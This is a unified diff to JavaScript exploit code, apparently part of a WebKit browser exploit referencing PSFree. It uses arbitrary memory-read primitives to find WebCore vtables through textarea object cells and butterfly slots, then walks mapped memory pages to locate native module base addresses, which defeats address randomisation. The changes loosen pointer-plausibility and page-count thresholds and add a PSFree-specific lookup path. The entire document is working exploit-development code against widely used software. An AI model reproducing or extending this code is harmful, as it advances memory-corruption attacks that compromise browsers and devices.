@@ -338,10 +338,20 @@ function looksLikeNativeCode(magic) {
     return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
 }
 
-function plausibleUserPtr(ptr) {
+function plausibleHeapPtr(ptr) {
+    if (!ptr) return false;
+    if (ptr.hi === 0 && ptr.low === 0) return false;
+    if (ptr.hi === 0 && ptr.low < 0x10000) return false;
+    return ptr.hi >= 0x1 && ptr.hi <= 0x12;
+}
+
+function plausibleModulePtr(ptr) {
     if (!ptr || ptr.hi === 0) return false;
-    if (ptr.hi < 0x8 || ptr.hi > 0x12) return false;
-    return true;
+    return ptr.hi >= 0x8 && ptr.hi <= 0x12;
+}
+
+function isMappedRead(p, addr) {
+    return !isBadRead(read4p(p, addr));
 }
 
 function countWalkMappedPages(p, startPtr, maxProbe, backward) {
@@ -349,24 +359,51 @@ function countWalkMappedPages(p, startPtr, maxProbe, backward) {
     for (let step = 0; step < maxProbe; step++) {
         const page = walkPageFrom(startPtr, step, backward);
         if (!page) break;
-        if (!isBadRead(read4p(p, page))) mapped++;
+        const probe = (step === 0) ? startPtr : page;
+        if (isMappedRead(p, probe)) mapped++;
+        else if (step === 0 && ptrNum(probe) !== ptrNum(page) && isMappedRead(p, page))
+            mapped++;
     }
     return mapped;
 }
 
 function scoreVtableCandidate(p, vt) {
-    if (!plausibleUserPtr(vt)) return -1;
+    if (!plausibleModulePtr(vt)) return -1;
     let codeEntries = 0;
     for (let i = 0; i < 4; i++) {
         const fn = read8p(p, vt.add32(i * 8));
-        if (!fn || !plausibleUserPtr(fn)) continue;
+        if (!fn || !plausibleModulePtr(fn)) continue;
         if (looksLikeNativeCode(read4p(p, fn))) codeEntries++;
     }
     if (codeEntries < 2) return -1;
+    if (!isMappedRead(p, vt)) return -1;
     const walkBack = countWalkMappedPages(p, vt, 48, true);
-    if (walkBack < 6) return -1;
     const walkFwd = countWalkMappedPages(p, vt, 8, false);
+    if (walkBack < 2 && walkFwd < 1) return -1;
     return codeEntries * 10 + walkBack + walkFwd;
+}
+
+function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra) {
+    if (!webcore || !plausibleHeapPtr(webcore)) return null;
+    const vt = read8p(p, webcore.add32(vtOff));
+    if (!vt) return null;
+    const score = scoreVtableCandidate(p, vt);
+    const e0 = read4p(p, vt);
+    mark("WEBCORE-TRY", path.label + " impl+0x" + implOff.toString(16)
+        + " webcore=" + webcore + " vtable=" + vt
+        + " entry0=" + fmtMagic(e0) + (score >= 0 ? " score=" + score : " reject"));
+    if (score < 0) return null;
+    return {
+        label: path.label + (labelExtra || ""),
+        cell: path.cell,
+        implOff,
+        vtOff,
+        webcore,
+        vtable: vt,
+        entry0: read8p(p, vt),
+        score,
+        walkBack: countWalkMappedPages(p, vt, 48, true),
+    };
 }
 
 function collectTextareaCells(p, carrier) {
@@ -439,51 +476,36 @@ function discoverTextareaVtableChains(p, carrier) {
 
     for (let ci = 0; ci < cells.length; ci++) {
         const path = cells[ci];
+        const psfree = tryWebcoreVtable(p, path, read8p(p, path.cell.add32(0x18)), 0x18, 0, "/psfree");
+        if (psfree) {
+            mark("VTABLE-CAND", "PSFree +0x18 m_wrapped vtable=" + psfree.vtable
+                + " score=" + psfree.score);
+            pushVtableHit(hits, seen, psfree);
+        }
+
         for (let implOff = 0x8; implOff <= 0x58; implOff += 8) {
+            if (implOff === 0x18 && psfree) continue;
             const webcore = read8p(p, path.cell.add32(implOff));
-            if (!webcore || !plausibleUserPtr(webcore)) continue;
+            if (!webcore || !plausibleHeapPtr(webcore)) continue;
             for (let vtOff = 0; vtOff <= 0x10; vtOff += 8) {
-                const vt = read8p(p, webcore.add32(vtOff));
-                const score = scoreVtableCandidate(p, vt);
-                if (score < 0) continue;
-                mark("VTABLE-CAND", path.label + " impl+0x" + implOff.toString(16)
-                    + " vt+0x" + vtOff.toString(16) + " webcore=" + webcore
-                    + " vtable=" + vt + " score=" + score);
-                pushVtableHit(hits, seen, {
-                    label: path.label,
-                    cell: path.cell,
-                    implOff,
-                    vtOff,
-                    webcore,
-                    vtable: vt,
-                    entry0: read8p(p, vt),
-                    score,
-                    walkBack: countWalkMappedPages(p, vt, 48, true),
-                });
+                const hit = tryWebcoreVtable(p, path, webcore, implOff, vtOff, "");
+                if (!hit) continue;
+                mark("VTABLE-CAND", hit.label + " impl+0x" + implOff.toString(16)
+                    + " vt+0x" + vtOff.toString(16) + " vtable=" + hit.vtable
+                    + " score=" + hit.score);
+                pushVtableHit(hits, seen, hit);
             }
         }
 
         const bfly = read8p(p, path.cell.add32(0x8));
-        if (!bfly || !plausibleUserPtr(bfly)) continue;
+        if (!bfly || !plausibleHeapPtr(bfly)) continue;
         for (let slot = 0; slot < 32; slot++) {
             const webcore = read8p(p, bfly.add32(slot * 8));
-            if (!webcore || !plausibleUserPtr(webcore)) continue;
-            const vt = read8p(p, webcore);
-            const score = scoreVtableCandidate(p, vt);
-            if (score < 0) continue;
-            mark("VTABLE-CAND", path.label + " bfly[" + slot + "] webcore=" + webcore
-                + " vtable=" + vt + " score=" + score);
-            pushVtableHit(hits, seen, {
-                label: path.label + "/bfly",
-                cell: path.cell,
-                implOff: 0x8,
-                vtOff: 0,
-                webcore,
-                vtable: vt,
-                entry0: read8p(p, vt),
-                score,
-                walkBack: countWalkMappedPages(p, vt, 48, true),
-            });
+            const hit = tryWebcoreVtable(p, path, webcore, 0x8, 0, "/bfly" + slot);
+            if (!hit) continue;
+            mark("VTABLE-CAND", hit.label + " webcore=" + webcore
+                + " vtable=" + hit.vtable + " score=" + hit.score);
+            pushVtableHit(hits, seen, hit);
         }
     }
 
@@ -623,17 +645,18 @@ function loadVtableOverride() {
 function collectWalkAnchors(p) {
     const out = [];
     const seen = new Set();
-    const add = (label, ptr, minWalkBack) => {
+    const add = (label, ptr, minWalkBack, force) => {
         if (!ptr || ptr.hi === 0) return;
         const k = ptrNum(ptr);
         if (seen.has(k)) return;
         const walkBack = countWalkMappedPages(p, ptr, 32, true);
-        if (walkBack < (minWalkBack == null ? 4 : minWalkBack)) {
-            mark("ANCHOR-SKIP", label + " " + ptr + " walkBack=" + walkBack + " (too few mapped pages)");
+        if (!force && walkBack < (minWalkBack == null ? 2 : minWalkBack)) {
+            mark("ANCHOR-SKIP", label + " " + ptr + " walkBack=" + walkBack
+                + " (too few mapped pages)");
             return;
         }
         seen.add(k);
-        out.push({ label, ptr, walkBack });
+        out.push({ label, ptr, walkBack, force: !!force });
     };
 
     vtableHit = null;
@@ -646,18 +669,18 @@ function collectWalkAnchors(p) {
             vtablePtr = h.vtable;
             try { sessionStorage.setItem(SS_VTABLE_PTR, String(h.vtable)); } catch (_) { }
         }
-        add("vtable/" + h.label + "+0x" + h.implOff.toString(16), h.vtable, 6);
+        add("vtable/" + h.label + "+0x" + h.implOff.toString(16), h.vtable, 2);
         if (h.entry0 && h.entry0.hi > 0)
-            add("vtable[0]/" + h.label, h.entry0, 4);
+            add("vtable[0]/" + h.label, h.entry0, 1);
         for (let i = 1; i < 4; i++) {
             const ei = read8p(p, h.vtable.add32(i * 8));
             if (ei && looksLikeNativeCode(read4p(p, ei)))
-                add("vtable[" + i + "]", ei, 4);
+                add("vtable[" + i + "]", ei, 1);
         }
     }
 
     if (nativeFn && looksLikeNativeCode(read4p(p, nativeFn)))
-        add("nativeFn", nativeFn, 6);
+        add("nativeFn", nativeFn, 0, true);
 
     return out;
 }
@@ -669,31 +692,36 @@ async function walkOneAnchor(p, anchor, label) {
 
     async function tryDir(backward, maxSteps, tag) {
         for (let step = 0; step < maxSteps; step++) {
-            const base = walkPageFrom(anchor, step, backward);
-            if (!base) break;
+            const probes = [];
+            if (step === 0) probes.push(anchor);
+            const page = walkPageFrom(anchor, step, backward);
+            if (page) probes.push(page);
 
-            const kind = classifyModulePage(p, base);
-            const w0 = read4p(p, base);
-            if (isBadRead(w0)) bad++;
-            else mapped++;
-            lastMagic = w0;
+            for (let pi = 0; pi < probes.length; pi++) {
+                const base = probes[pi];
+                const kind = classifyModulePage(p, base);
+                const w0 = read4p(p, base);
+                if (isBadRead(w0)) bad++;
+                else mapped++;
+                lastMagic = w0;
 
-            const n = step + 1;
-            if (n === 1 || n % WALK_LOG_EVERY === 0 || kind) {
-                mark("VTABLE-FIND", label + " " + tag + " " + n + "/" + maxSteps
-                    + " base=" + base + " got=" + fmtMagic(w0)
-                    + (kind ? " (" + kind + ")" : ""));
+                const n = step + 1;
+                if (pi === 0 && (n === 1 || n % WALK_LOG_EVERY === 0 || kind)) {
+                    mark("VTABLE-FIND", label + " " + tag + " " + n + "/" + maxSteps
+                        + " base=" + base + " got=" + fmtMagic(w0)
+                        + (kind ? " (" + kind + ")" : ""));
+                }
+                if (n % 64 === 0 && pi === 0)
+                    state(label + " " + tag + " " + n + "/" + maxSteps + "…", "warn");
+
+                if (kind) {
+                    const resolved = resolveModuleBase(p, base, kind);
+                    mark("MODULE-HIT", label + " " + tag + " kind=" + kind + " base=" + resolved);
+                    return resolved;
+                }
             }
-            if (n % 64 === 0)
-                state(label + " " + tag + " " + n + "/" + maxSteps + "…", "warn");
 
-            if (kind) {
-                const resolved = resolveModuleBase(p, base, kind);
-                mark("MODULE-HIT", label + " " + tag + " kind=" + kind + " base=" + resolved);
-                return resolved;
-            }
-
-            if (WALK_YIELD_EVERY > 0 && n % WALK_YIELD_EVERY === 0)
+            if (WALK_YIELD_EVERY > 0 && (step + 1) % WALK_YIELD_EVERY === 0)
                 await new Promise(r => setTimeout(r, 0));
         }
         return null;
